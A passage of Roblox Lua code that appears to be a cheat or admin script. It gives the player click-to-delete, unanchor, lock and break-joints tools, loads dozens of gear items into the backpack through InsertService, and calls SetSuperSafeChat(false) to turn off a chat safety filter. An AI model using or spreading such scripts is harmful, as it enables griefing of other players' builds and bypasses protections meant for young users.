																if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																	if(md3==1)then
																		mouse.Target.Anchored=true
																	elseif(md3==2)then
																		mouse.Target.Anchored=false
																	end
																end
															end
														end
													end
												end
											end)
										end
										function achUp()
											ach_upFunc=mouse.Button1Up:connect(function()
												lvi=false
											end)
										end
										function colDown()
											col_downFunc=mouse.Button1Down:connect(function()
												md2=3
												if(md2==3)then
													if(md1==1)then
														if(mouse.Target~=nil)then
															if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																if(mouse.Target.CanCollide)then
																	mouse.Target.CanCollide=false
																else
																	mouse.Target.CanCollide=true
																end
															end
														end
													elseif(md1==2)then
														lvi=true
														while(lvi)and wait() do
															if(mouse.Target~=nil)then
																if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																	if(md3==1)then
																		mouse.Target.CanCollide=true
																	elseif(md3==2)then
																		mouse.Target.CanCollide=false
																	end
																end
															end
														end
													end
												end
											end)
										end
										function colUp()
											col_upFunc=mouse.Button1Up:connect(function()
												lvi=false
											end)
										end
										function lckDown()
											lck_downFunc=mouse.Button1Down:connect(function()
												md2=4
												if(md2==4)then
													if(md1==1)then
														if(mouse.Target~=nil)then
															if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																if(mouse.Target.Locked)then
																	mouse.Target.Locked=false
																else
																	mouse.Target.Locked=true
																end
															end
														end
													elseif(md1==2)then
														lvi=true
														while(lvi)and wait() do
															if(mouse.Target~=nil)then
																if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																	if(md3==1)then
																		mouse.Target.Locked=true
																	elseif(md3==2)then
																		mouse.Target.Locked=false
																	end
																end
															end
														end
													end
												end
											end)
										end
										function lckUp()
											lck_upFunc=mouse.Button1Up:connect(function()
												lvi=false
											end)
										end
										function brkDown()
											brk_downFunc=mouse.Button1Down:connect(function()
												md2=5
												if(md2==5)then
													if(md1==1)then
														if(mouse.Target~=nil)then
															if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																clr=false
																box.Color=BrickColor.new("Bright red")
																mouse.Target:BreakJoints()
															end
														end
													elseif(md1==2)then
														lvi=true
														while(lvi)and wait() do
															if(mouse.Target~=nil)then
																if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																	mouse.Target:BreakJoints()
																	cle=true
																else
																	cle=true
																end
															else
																cle=false
															end
														end
													end
												end
											end)
										end
										function brkUp()
											brk_upFunc=mouse.Button1Up:connect(function()
												clr=true
												lvi=false
												cle=false
											end)
										end
										delDown()
										delUp()
										achDown()
										achUp()
										colDown()
										colUp()
										lckDown()
										lckUp()
										brkDown()
										brkUp()
										del.MouseButton1Click:connect(function()
											md2=1
											del_downFunc:disconnect()
											del_upFunc:disconnect()
											ach_downFunc:disconnect()
											ach_upFunc:disconnect()
											col_downFunc:disconnect()
											col_upFunc:disconnect()
											lck_downFunc:disconnect()
											lck_upFunc:disconnect()
											brk_downFunc:disconnect()
											brk_upFunc:disconnect()
											del.Style="RobloxButtonDefault"
											del.Selected=true
											ach.Style="RobloxButton"
											ach.Selected=false
											col.Style="RobloxButton"
											col.Selected=false
											lck.Style="RobloxButton"
											lck.Selected=false
											brk.Style="RobloxButton"
											brk.Selected=false
											delDown()
											delUp()
										end)
										ach.MouseButton1Click:connect(function()
											md2=2
											del_downFunc:disconnect()
											del_upFunc:disconnect()
											ach_downFunc:disconnect()
											ach_upFunc:disconnect()
											col_downFunc:disconnect()
											col_upFunc:disconnect()
											lck_downFunc:disconnect()
											lck_upFunc:disconnect()
											brk_downFunc:disconnect()
											brk_upFunc:disconnect()
											del.Style="RobloxButton"
											del.Selected=false
											ach.Style="RobloxButtonDefault"
											ach.Selected=true
											col.Style="RobloxButton"
											col.Selected=false
											lck.Style="RobloxButton"
											lck.Selected=false
											brk.Style="RobloxButton"
											brk.Selected=false
											achDown()
											achUp()
										end)
										col.MouseButton1Click:connect(function()
											md2=3
											del_downFunc:disconnect()
											del_upFunc:disconnect()
											ach_downFunc:disconnect()
											ach_upFunc:disconnect()
											col_downFunc:disconnect()
											col_upFunc:disconnect()
											lck_downFunc:disconnect()
											lck_upFunc:disconnect()
											brk_downFunc:disconnect()
											brk_upFunc:disconnect()
											del.Style="RobloxButton"
											del.Selected=false
											ach.Style="RobloxButton"
											ach.Selected=false
											col.Style="RobloxButtonDefault"
											col.Selected=true
											lck.Style="RobloxButton"
											lck.Selected=false
											brk.Style="RobloxButton"
											brk.Selected=false
											colDown()
											colUp()
										end)
										lck.MouseButton1Click:connect(function()
											md2=4
											del_downFunc:disconnect()
											del_upFunc:disconnect()
											ach_downFunc:disconnect()
											ach_upFunc:disconnect()
											col_downFunc:disconnect()
											col_upFunc:disconnect()
											lck_downFunc:disconnect()
											lck_upFunc:disconnect()
											brk_downFunc:disconnect()
											brk_upFunc:disconnect()
											del.Style="RobloxButton"
											del.Selected=false
											ach.Style="RobloxButton"
											ach.Selected=false
											col.Style="RobloxButton"
											col.Selected=false
											lck.Style="RobloxButtonDefault"
											lck.Selected=true
											brk.Style="RobloxButton"
											brk.Selected=false
											lckDown()
											lckUp()
										end)
										brk.MouseButton1Click:connect(function()
											md2=5
											del_downFunc:disconnect()
											del_upFunc:disconnect()
											ach_downFunc:disconnect()
											ach_upFunc:disconnect()
											col_downFunc:disconnect()
											col_upFunc:disconnect()
											lck_downFunc:disconnect()
											lck_upFunc:disconnect()
											brk_downFunc:disconnect()
											brk_upFunc:disconnect()
											del.Style="RobloxButton"
											del.Selected=false
											ach.Style="RobloxButton"
											ach.Selected=false
											col.Style="RobloxButton"
											col.Selected=false
											lck.Style="RobloxButton"
											lck.Selected=false
											brk.Style="RobloxButtonDefault"
											brk.Selected=true
											brkDown()
											brkUp()
										end)
										set.MouseButton1Click:connect(function()
											if(ste)then
												ste=false
												frs.Visible=false
												set.Style="RobloxButton"
											else
												ste=true
												frs.Visible=true
												set.Style="RobloxButtonDefault"
											end
										end)
										cls.MouseButton1Click:connect(function()
											ste=false
											frs.Visible=false
											set.Style="RobloxButton"
										end)
										ckb.MouseButton1Click:connect(function()
											md1=1
											ckb.Style="RobloxButtonDefault"
											ckb.Selected=true
											ckb.Text="Enabled"
											ckb.TextColor3=Color3.new(0,1,0)
											ryb.Style="RobloxButton"
											ryb.Selected=false
											ryb.Text="Disabled"
											ryb.TextColor3=Color3.new(1,0,0)
										end)
										ryb.MouseButton1Click:connect(function()
											md1=2
											ryb.Style="RobloxButtonDefault"
											ryb.Selected=true
											ryb.Text="Enabled"
											ryb.TextColor3=Color3.new(0,1,0)
											ckb.Style="RobloxButton"
											ckb.Selected=false
											ckb.Text="Disabled"
											ckb.TextColor3=Color3.new(1,0,0)
										end)
										rfb.MouseButton1Click:connect(function()
											if(md3==1)then
												md3=2
												rfb.Style="RobloxButton"
												rfb.Text="Disable Propertie"
												rfb.TextColor3=Color3.new(1,0,0)
											elseif(md3==2)then
												md3=1
												rfb.Style="RobloxButtonDefault"
												rfb.Text="Enable Propertie"
												rfb.TextColor3=Color3.new(0,1,0)
											end
										end)
									end)

									bin.Deselected:connect(function() print("iBTool_Deselected")
										clr=false
										if(box~=nil)then
											box:remove()
										end
										if(lso~=nil)then
											lso:remove()
										end
										if(gui~=nil)then
											gui:remove()
										end
									end)]]
								iBToolScript.Disabled=true
								iBToolScript.Disabled=false
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild("LoadingBTools..."))then
                                        local load=ctool("LoadingBTools...")
                                end
                                local insrt1 = game:GetService("InsertService"):LoadAsset(58901534)--resize
                                for _, v in pairs(insrt1:GetChildren()) do
                                v.Name='iResizeTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt1 = game:GetService("InsertService"):LoadAsset(16975388)--config1
                                for _, v in pairs(insrt1:GetChildren()) do
                                v.Name='iConfigTool1'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt2 = game:GetService("InsertService"):LoadAsset(18474459)--paint
                                for _, v in pairs(insrt2:GetChildren()) do
                                v.Name='iPaintTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt3 = game:GetService("InsertService"):LoadAsset(36334760)--dragger
                                for _, v in pairs(insrt3:GetChildren()) do
								v.Name='iDraggerTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt4 = game:GetService("InsertService"):LoadAsset(58901405)--material
                                for _, v in pairs(insrt4:GetChildren()) do
                                v.Name='iMaterialTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt5 = game:GetService("InsertService"):LoadAsset(58901575)--surface
                                for _, v in pairs(insrt5:GetChildren()) do
                                v.Name='iSurfaceTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt6 = game:GetService("InsertService"):LoadAsset(58901335)--insert
                                for _, v in pairs(insrt6:GetChildren()) do
                                v.Name='iInsertTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt7 = game:GetService("InsertService"):LoadAsset(55028088)--stamper
                                for _, v in pairs(insrt7:GetChildren()) do
                                v.Name='iStamperTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt8 = game:GetService("InsertService"):LoadAsset(73089239)--config2
                                for _, v in pairs(insrt8:GetChildren()) do
                                v.Name='iConfigTool2'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt9 = game:GetService("InsertService"):LoadAsset(58880579)--rotate
                                for _, v in pairs(insrt9:GetChildren()) do
                                v.Name='iRotateTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt10 = game:GetService("InsertService"):LoadAsset(60791062)--wiring
                                for _, v in pairs(insrt10:GetChildren()) do
                                v.Name='iWiringTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt10 = game:GetService("InsertService"):LoadAsset(36738185)--delete
                                for _, v in pairs(insrt10:GetChildren()) do
                                v.Name='iDeleteTool'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								wait()
                                if (game.Players.LocalPlayer.Backpack:FindFirstChild("LoadingBTools..."))then
                                        game.Players.LocalPlayer.Backpack:FindFirstChild("LoadingBTools..."):remove()
                                end
                        end))
                elseif Key==GearKey then
                        Player:SetSuperSafeChat(false)
                        coroutine.resume(coroutine.create(function()
								if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iMergeTool"))then
										MergeTool=ctool("iMergeTool")
										MergeScript=Instance.new("LocalScript",MergeTool)
								end
								MergeScript.Source=MergeScriptSource
								MergeScript.Disabled=true
								MergeScript.Disabled=false
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild("LoadingGears..."))then
                                        local load=ctool("LoadingGears...")
                                end
                                local insrt8 = game:GetService("InsertService"):LoadAsset(16688968)--coil
                                for _, v in pairs(insrt8:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt9 = game:GetService("InsertService"):LoadAsset(52180871)--remotecontroltruck
                                for _, v in pairs(insrt9:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt10 = game:GetService("InsertService"):LoadAsset(55917429)--bow
                                for _, v in pairs(insrt10:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt11 = game:GetService("InsertService"):LoadAsset(31314931)--epicsauce
                                for _, v in pairs(insrt11:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt12 = game:GetService("InsertService"):LoadAsset(65545955)--dancegrenade
                                for _, v in pairs(insrt12:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt13 = game:GetService("InsertService"):LoadAsset(28277486)--bomb
                                for _, v in pairs(insrt13:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt14 = game:GetService("InsertService"):LoadAsset(27902406)--skate
                                for _, v in pairs(insrt14:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt15 = game:GetService("InsertService"):LoadAsset(42845853)--freezeray
                                for _, v in pairs(insrt15:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt16 = game:GetService("InsertService"):LoadAsset(50937815)--atomgun
                                for _, v in pairs(insrt16:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt17 = game:GetService("InsertService"):LoadAsset(34898883)--platformproducer
                                for _, v in pairs(insrt17:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt18 = game:GetService("InsertService"):LoadAsset(35683911)--wallwalker
                                for _, v in pairs(insrt18:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt19 = game:GetService("InsertService"):LoadAsset(68603151)--sentry
                                for _, v in pairs(insrt19:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt20 = game:GetService("InsertService"):LoadAsset(26421972)--zombie
                                for _, v in pairs(insrt20:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt21 = game:GetService("InsertService"):LoadAsset(34901961)--gravity
                                for _, v in pairs(insrt21:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt22 = game:GetService("InsertService"):LoadAsset(10468797)--banhammer
                                for _, v in pairs(insrt22:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt23 = game:GetService("InsertService"):LoadAsset(71422361)--coolsword1
                                for _, v in pairs(insrt23:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt24 = game:GetService("InsertService"):LoadAsset(62350883)--coolsword2
                                for _, v in pairs(insrt24:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt25 = game:GetService("InsertService"):LoadAsset(30847733)--vinestaff
                                for _, v in pairs(insrt25:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt26 = game:GetService("InsertService"):LoadAsset(48596324)--leviatingstaff
                                for _, v in pairs(insrt26:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt27 = game:GetService("InsertService"):LoadAsset(61459706)--polaritystaff
                                for _, v in pairs(insrt27:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt28 = game:GetService("InsertService"):LoadAsset(66416616)--zeusstaff
                                for _, v in pairs(insrt28:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt29 = game:GetService("InsertService"):LoadAsset(33866846)--gravhammer
                                for _, v in pairs(insrt29:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt30 = game:GetService("InsertService"):LoadAsset(30847779)--magicninja
                                for _, v in pairs(insrt30:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt31 = game:GetService("InsertService"):LoadAsset(60888284)--dualkamas
                                for _, v in pairs(insrt31:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt32 = game:GetService("InsertService"):LoadAsset(42845609)--bbgun
                                for _, v in pairs(insrt32:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt33 = game:GetService("InsertService"):LoadAsset(32356064)--rocketlauncher
                                for _, v in pairs(insrt33:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt34 = game:GetService("InsertService"):LoadAsset(69209924)--r80launcher
                                for _, v in pairs(insrt34:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt35 = game:GetService("InsertService"):LoadAsset(69947379)--revengeancespear
                                for _, v in pairs(insrt35:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt36 = game:GetService("InsertService"):LoadAsset(51760061)--deathspeaker
                                for _, v in pairs(insrt36:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt37 = game:GetService("InsertService"):LoadAsset(59175769)--flamethrower1
                                for _, v in pairs(insrt37:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt38 = game:GetService("InsertService"):LoadAsset(69499452)--laservision
                                for _, v in pairs(insrt38:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt39 = game:GetService("InsertService"):LoadAsset(65082246)--dreamselixir
                                for _, v in pairs(insrt39:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt40 = game:GetService("InsertService"):LoadAsset(55917420)--hydrianelexir
                                for _, v in pairs(insrt40:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt41 = game:GetService("InsertService"):LoadAsset(50938746)--fermionblade
                                for _, v in pairs(insrt41:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt42 = game:GetService("InsertService"):LoadAsset(72644644)--quantumentangler
                                for _, v in pairs(insrt42:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt43 = game:GetService("InsertService"):LoadAsset(72713855)--giantoform
                                for _, v in pairs(insrt43:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt44 = game:GetService("InsertService"):LoadAsset(26774629)--expander
                                for _, v in pairs(insrt44:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt45 = game:GetService("InsertService"):LoadAsset(66426498)--kami
                                for _, v in pairs(insrt45:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt46 = game:GetService("InsertService"):LoadAsset(66896565)--missiletoe
                                for _, v in pairs(insrt46:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt47 = game:GetService("InsertService"):LoadAsset(69499437)--azureperiastron
                                for _, v in pairs(insrt47:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt48 = game:GetService("InsertService"):LoadAsset(71037028)--magiccarpet
                                for _, v in pairs(insrt48:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt49 = game:GetService("InsertService"):LoadAsset(68354832)--blizzardwand
                                for _, v in pairs(insrt49:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt50 = game:GetService("InsertService"):LoadAsset(66896601)--neverendingfroststaff
                                for _, v in pairs(insrt50:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt51 = game:GetService("InsertService"):LoadAsset(72644629)--orb
                                for _, v in pairs(insrt51:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt52 = game:GetService("InsertService"):LoadAsset(48596305)--confusoray
                                for _, v in pairs(insrt52:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt53 = game:GetService("InsertService"):LoadAsset(45941451)--danceblaster
                                for _, v in pairs(insrt53:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt54 = game:GetService("InsertService"):LoadAsset(30393548)--grapplehook
                                for _, v in pairs(insrt54:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt55 = game:GetService("InsertService"):LoadAsset(59848474)--deathspeakerbook
                                for _, v in pairs(insrt55:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt56 = game:GetService("InsertService"):LoadAsset(49491736)--dracovinbook
                                for _, v in pairs(insrt56:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt57 = game:GetService("InsertService"):LoadAsset(56561607)--dracovinwand
                                for _, v in pairs(insrt57:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt58 = game:GetService("InsertService"):LoadAsset(49491716)--mischiefwand
                                for _, v in pairs(insrt58:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt59 = game:GetService("InsertService"):LoadAsset(16979083)--flashbang
                                for _, v in pairs(insrt59:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt60 = game:GetService("InsertService"):LoadAsset(27860496)--novawand
                                for _, v in pairs(insrt60:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt61 = game:GetService("InsertService"):LoadAsset(56561579)--forgottenbook
                                for _, v in pairs(insrt61:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt62 = game:GetService("InsertService"):LoadAsset(69210407)--remoteplanecontrol
                                for _, v in pairs(insrt62:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt63 = game:GetService("InsertService"):LoadAsset(66823689)--icicleslicer
                                for _, v in pairs(insrt63:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt64 = game:GetService("InsertService"):LoadAsset(61459678)--nekotikozphaser
                                for _, v in pairs(insrt64:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt65 = game:GetService("InsertService"):LoadAsset(64220933)--ghostfiresword
                                for _, v in pairs(insrt65:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt66 = game:GetService("InsertService"):LoadAsset(64869947)--ninjabomb
